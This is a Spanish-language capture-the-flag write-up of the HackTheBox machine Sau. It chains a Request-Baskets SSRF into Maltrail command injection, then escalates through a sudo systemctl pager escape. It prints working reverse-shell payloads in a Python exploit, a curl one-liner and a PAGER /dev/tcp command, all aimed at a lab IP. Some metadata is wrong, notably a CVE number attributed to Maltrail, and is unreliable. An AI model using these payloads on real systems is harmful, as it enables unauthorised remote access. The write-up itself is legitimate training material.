---
title: "Sau - HackTheBox"
description: "Writeup de la máquina Sau de HackTheBox, una máquina Linux fácil que involucra SSRF en Request-Baskets y explotación de Maltrail."
pubDate: 2026-11-02
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
language: es
tags: ["ssrf", "request-baskets", "maltrail", "CVE-2023-27163", "command-injection"]
retired: false
logo: "/images/writeups/htb/sau/logo.png"
heroImage: "/images/writeups/htb/sau/card.png"
attackVectors: ["web"]
techniques: ["T1190", "T1918", "T1059"]
vulnerabilities: ["CVE-2023-27163", "CVE-2023-26035"]
certifications: ["OSCP", "eJPT"]
skillLevel: "beginner"
estimatedTime: "1-2 horas"
points: 20
rating: 4.4
---

# Sau - HackTheBox Writeup

**Dificultad**: Easy  
**OS**: Linux  
**Plataforma**: HackTheBox  
**IP**: 10.10.11.224

## Introducción

Sau es una máquina Linux de dificultad fácil que presenta un servicio Request-Baskets vulnerable a SSRF (CVE-2023-27163). Usando esta vulnerabilidad, accederemos a un servicio interno Maltrail que es vulnerable a command injection, permitiéndonos obtener acceso inicial y posteriormente escalar privilegios mediante sudo.

## Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.224 -oG allPorts
```

**Puertos abiertos:**
- 22/tcp - SSH
- 55555/tcp - HTTP (filtrado inicialmente)
- 80/tcp - HTTP (filtrado)

### Escaneo de servicios

```bash
nmap -p22,55555,80 -sCV 10.10.11.224 -oN targeted
```

**Resultados:**
- **22/tcp** - OpenSSH 8.2p1 Ubuntu
- **55555/tcp** - HTTP - request-baskets 1.2.1
- **80/tcp** - Filtrado

## Enumeración Web

### Request-Baskets (Puerto 55555)

Al acceder a `http://10.10.11.224:55555`, encontramos **Request-Baskets v1.2.1**, una herramienta para crear endpoints HTTP temporales.

### Investigación de vulnerabilidades

Buscando vulnerabilidades de Request-Baskets 1.2.1, encontramos **CVE-2023-27163** - Server-Side Request Forgery (SSRF).

## Explotación

### CVE-2023-27163 - SSRF en Request-Baskets

Esta vulnerabilidad permite a un atacante acceder a recursos internos usando el servidor como proxy.

### Creación de un basket

```bash
curl -X POST http://10.10.11.224:55555/api/baskets/test -H 'Content-Type: application/json' -d '{"forward_url": "http://127.0.0.1:80/","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}'
```

o usando la interfaz web, creamos un basket llamado "test" con la configuración:
- **Forward URL**: http://127.0.0.1:80/
- **Proxy Response**: ✓

### Acceso al servicio interno

Accedemos a `http://10.10.11.224:55555/test` y se nos redirige al servicio interno en el puerto 80.

### Descubrimiento de Maltrail

El servicio interno es **Maltrail v0.53**, un sistema de detección de tráfico malicioso.

## Explotación de Maltrail

### CVE-2023-26035 - Command Injection en Maltrail

Maltrail v0.53 es vulnerable a command injection sin autenticación en el endpoint de login.

### PoC disponible

```bash
git clone https://github.com/spookier/Maltrail-v0.53-Exploit
cd Maltrail-v0.53-Exploit
```

### Modificación del exploit

El exploit original hace RCE directamente. Lo modificamos para usar SSRF:

```python
#!/usr/bin/env python3
import sys
import os
import base64
import requests

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <LHOST> <LPORT>")
        sys.exit(1)
    
    lhost = sys.argv[1]
    lport = sys.argv[2]
    
    # Reverse shell payload
    payload = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\"])'"
    
    # Encode payload
    encoded = base64.b64encode(payload.encode()).decode()
    
    # Target through SSRF
    target = "http://10.10.11.224:55555/test"
    
    # Malicious username
    username = f";`echo {encoded}|base64 -d|bash`"
    
    # Send exploit
    data = {"username": username}
    
    print(f"[+] Sending exploit to {target}")
    requests.post(target + "/login", data=data)
    print(f"[+] Check your listener on {lhost}:{lport}")

if __name__ == "__main__":
    main()
```

### Ejecución del exploit

```bash
# Configurar listener
nc -lvnp 443

# Ejecutar exploit
python3 exploit.py 10.10.14.5 443
```

**Shell obtenido como usuario:** puma

### Tratamiento de la TTY

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

**User flag:**
```bash
cat /home/puma/user.txt
```

## Escalada de Privilegios

### Enumeración de privilegios sudo

```bash
sudo -l
```

**Resultado:**
```
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

### Explotación de systemctl

Podemos ejecutar `systemctl status` sin contraseña. Este comando usa `less` como pager, lo que nos permite ejecutar comandos.

### Método 1: Escape desde less

```bash
sudo /usr/bin/systemctl status trail.service
# Dentro de less, presionamos:
!bash
```

Obtenemos shell como root.

### Método 2: Variable PAGER

```bash
sudo PAGER='bash -c "bash -i >&/dev/tcp/10.10.14.5/9001 0>&1"' /usr/bin/systemctl status trail.service
```

### Método 3: GTFOBins

```bash
sudo /usr/bin/systemctl status trail.service
!/bin/sh
```

**Root flag:**
```bash
cat /root/root.txt
```

## Explotación Alternativa - Manual

### SSRF Manual

1. Crear basket en la interfaz web
2. Configurar Forward URL: `http://127.0.0.1:80/`
3. Habilitar "Proxy Response"
4. Acceder al basket

### Maltrail RCE Manual

```bash
# Listener
nc -lvnp 443

# Exploit manual con curl
curl -X POST 'http://10.10.11.224:55555/test/login' \
  --data 'username=;`python3 -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'"'"'`'
```

## Conclusión

Sau es una excelente máquina para practicar:
- Explotación de SSRF (CVE-2023-27163)
- Pivoting a través de servicios internos
- Command injection en aplicaciones web
- Explotación de systemctl y pagers
- Técnicas de escape de comandos

**Lecciones aprendidas:**
- Los servicios internos pueden ser accesibles mediante SSRF
- Siempre enumerar servicios filtrados
- Validar entrada en todos los parámetros de usuario
- Los comandos con pagers (less, more) pueden ser vectores de escalada
- Revisar permisos sudo cuidadosamente

**Mitigaciones:**
- Actualizar Request-Baskets a versiones parcheadas
- Implementar validación estricta de URLs en proxies
- Actualizar Maltrail a la última versión
- Sanitizar entrada en endpoints de autenticación
- Limitar comandos sudo a operaciones específicas sin shell escape
- Usar systemctl con --no-pager cuando sea posible
- Implementar network segmentation para servicios internos
